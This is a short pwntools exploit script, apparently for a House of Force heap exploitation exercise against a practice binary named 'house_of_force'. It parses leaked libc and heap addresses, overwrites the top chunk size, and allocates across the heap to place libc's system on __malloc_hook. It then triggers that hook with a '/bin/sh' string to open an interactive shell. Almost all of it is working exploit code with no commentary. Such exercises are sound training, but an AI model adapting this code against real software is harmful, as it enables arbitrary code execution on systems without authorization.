from pwn import *
from os import system
from signal import SIGINT

elf = context.binary = ELF("house_of_force")
libc = elf.libc
context.terminal = "kitty"
ASLR = False

gs = """
continue
continue
"""

def start():
    return process(elf.path)
    #return gdb.debug(elf.path, gdbscript=gs,aslr=ASLR)


def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

malloc(24, b"A"*24 + p64(0xffffffffffffffff))

distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

malloc(distance, b"/bin/sh\x00")

malloc(24,p64(libc.sym.system))
cmd = heap + 0x30
malloc(cmd,b"")

# =============================================================================

io.interactive()
